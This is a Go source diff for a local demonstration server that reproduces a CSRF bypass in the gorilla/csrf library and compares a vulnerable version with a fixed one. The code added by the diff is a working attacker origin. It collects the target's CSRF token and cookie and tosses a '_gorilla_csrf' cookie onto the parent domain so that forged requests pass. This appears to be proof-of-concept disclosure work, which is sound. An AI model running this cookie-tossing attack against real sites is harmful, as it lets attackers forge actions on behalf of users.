@@ -3,15 +3,22 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	_ "embed"
+	"encoding/json"
 	"flag"
+	"fmt"
 	"html/template"
 	"io"
 	"log"
 	"net/http"
+	"net/http/cookiejar"
+	"strings"
+	"sync"
 
-	_ "embed"
+	safe "csrf/fixed"
+	csrf "csrf/vulnerable"
 
-	"github.com/gorilla/csrf"
+	"golang.org/x/net/publicsuffix"
 )
 
 var (
@@ -23,12 +30,9 @@ var (
 	targetTemplateBytes []byte
 	targetTemplate      = template.Must(template.New("target").Parse(string(targetTemplateBytes)))
 
-	//go:embed inject.js
-	injectJSTemplateBytes []byte
-	injectJSTemplate      = template.Must(template.New("inject.js").Parse(string(injectJSTemplateBytes)))
-
 	// CLI flags
 	domain      = flag.String("domain", "example.test", "domain to use for the demo (bind it, target.$DOMAIN, and bad.$DOMAIN to localhost with /etc/hosts)")
+	listen      = flag.String("listen", ":443", "address to listen on")
 	tlsCertFile = flag.String("tls-cert", "", "path to TLS certificate file")
 	tlsKeyFile  = flag.String("tls-key", "", "path to TLS key file")
 )
@@ -45,22 +49,25 @@ func main() {
 	}
 
 	config := &tls.Config{Certificates: []tls.Certificate{crt}}
-	ln, err := tls.Listen("tcp", ":443", config)
+	ln, err := tls.Listen("tcp", *listen, config)
 	if err != nil {
 		log.Fatal(err)
 	}
 	log.Printf("listening on %s", ln.Addr())
 
-	primaryOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(http.HandlerFunc(primaryOriginHandler))
+	vulnerableOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(http.HandlerFunc(targetOriginHandler))
+	safeOrigin := safe.Protect([]byte("32-byte-long-auth-key"), safe.Secure(true))(http.HandlerFunc(targetOriginHandler))
 
-	attackerOriginMux := http.NewServeMux()
-	attackerOriginMux.HandleFunc("/", attackerOriginHandler)
+	as := newAttackerServer(*domain)
 
 	if err := http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.Host == "bad."+*domain {
-			attackerOriginMux.ServeHTTP(w, r)
-		} else {
-			primaryOrigin.ServeHTTP(w, r)
+		switch {
+		case strings.HasPrefix(r.Host, "safe."):
+			safeOrigin.ServeHTTP(w, r)
+		case strings.HasPrefix(r.Host, "bad."):
+			as.ServeHTTP(w, r)
+		default:
+			vulnerableOrigin.ServeHTTP(w, r)
 		}
 	})); err != nil && err != http.ErrServerClosed {
 		log.Fatal(err)
@@ -85,29 +92,30 @@ func serveTargetHome(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func serveInjectJS(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "application/javascript")
+// serveParams exports the CSRF token and the encoded token to the attacker origin.
+// in reality an attacker would scrape the target to obtain these values
+func serveParams(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
 	b := bytes.NewBuffer(nil)
-
-	if err := injectJSTemplate.Execute(b, map[string]any{
-		"Domain": *domain,
-		"Token":  csrf.Token(r),
+	if err := json.NewEncoder(w).Encode(map[string]string{
+		"token": csrf.Token(r),
 	}); err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
 	}
 	if _, err := io.Copy(w, b); err != nil {
 		log.Printf("error writing response: %v", err)
 	}
 }
 
-func primaryOriginHandler(w http.ResponseWriter, r *http.Request) {
+func targetOriginHandler(w http.ResponseWriter, r *http.Request) {
 	switch r.Method {
 	case "GET":
 		switch r.URL.Path {
 		case "/":
 			serveTargetHome(w, r)
-		case "/inject.js":
-			serveInjectJS(w, r)
+		case "/params.json":
+			serveParams(w, r)
 		default:
 			http.Error(w, "not found", http.StatusNotFound)
 		}
@@ -120,12 +128,66 @@ func primaryOriginHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func attackerOriginHandler(w http.ResponseWriter, r *http.Request) {
+type attackerServer struct {
+	// target to scrape/CSRF attack
+	target string
+	// current cookie identify to use for CSRF attack
+	currentCookie string
+	// mutex for scraping target to prevent clobbering identities
+	scrapeMutex sync.Mutex
+	// client to use for scraping target w/ cookiejar
+	client *http.Client
+}
+
+func newAttackerServer(target string) *attackerServer {
+	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
+	if err != nil {
+		log.Fatal(err)
+	}
+	client := &http.Client{Jar: jar}
+
+	return &attackerServer{
+		target:      target,
+		client:      client,
+		scrapeMutex: sync.Mutex{},
+	}
+}
+
+func (as *attackerServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	switch r.Method {
+	case "GET":
+		as.attackerOriginHandler(w, r)
+	// case "POST":
+	// 	as.attackerOriginHandler(w, r)
+	default:
+		http.Error(w, "invalid method", http.StatusMethodNotAllowed)
+	}
+}
+
+func (as *attackerServer) attackerOriginHandler(w http.ResponseWriter, _ *http.Request) {
+	// make request to the target origin to fetch CSRF token & cookie values
+	token, cookie, err := as.scrapeTarget(*domain)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	// set a cookie for the common top-level domain (e.g. example.test)
+	// using the exfiltrated CSRF cookie value scraped from the target
+	clobberCookie := http.Cookie{
+		Name:   "_gorilla_csrf",
+		Value:  cookie,
+		Path:   "/submit",
+		Domain: *domain,
+	}
+	http.SetCookie(w, &clobberCookie)
+
 	// template the attacker page
 	w.Header().Set("Content-Type", "text/html")
 	data := map[string]any{
 		"Domain": *domain,
-		"Token":  "attacker-controlled",
+		"Token":  token,
+		"Cookie": cookie,
 	}
 	b := bytes.NewBuffer(nil)
 	if err := attackerTemplate.Execute(b, data); err != nil {
@@ -136,4 +198,42 @@ func attackerOriginHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("error writing response: %v", err)
 		return
 	}
+}
+
+func (as *attackerServer) scrapeTarget(domain string) (token, cookie string, err error) {
+	resp, err := as.client.Get("https://" + domain + "/params.json")
+	if err != nil {
+		return "", "", err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return "", "", fmt.Errorf("unexpected status code: %d", resp.StatusCode)
+	}
+	var params struct {
+		Token string `json:"token"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&params); err != nil {
+		return "", "", err
+	}
+
+	// use our current cookie; override if we have been given a new one
+	cookie = as.currentCookie
+	cookieHeader := resp.Header.Get("Set-Cookie")
+	if strings.HasPrefix(cookieHeader, "_gorilla_csrf=") {
+		cookieParts := strings.Split(cookieHeader, ";")
+		cookieHeader = cookieParts[0]
+		cookie = strings.TrimPrefix(cookieHeader, "_gorilla_csrf=")
+	}
+
+	if params.Token == "" {
+		return "", "", fmt.Errorf("no token found")
+	}
+	if cookie == "" {
+		return "", "", fmt.Errorf("no cookie found")
+	}
+
+	// persist cookie for next scrape
+	as.currentCookie = cookie
+
+	return params.Token, cookie, nil
 }
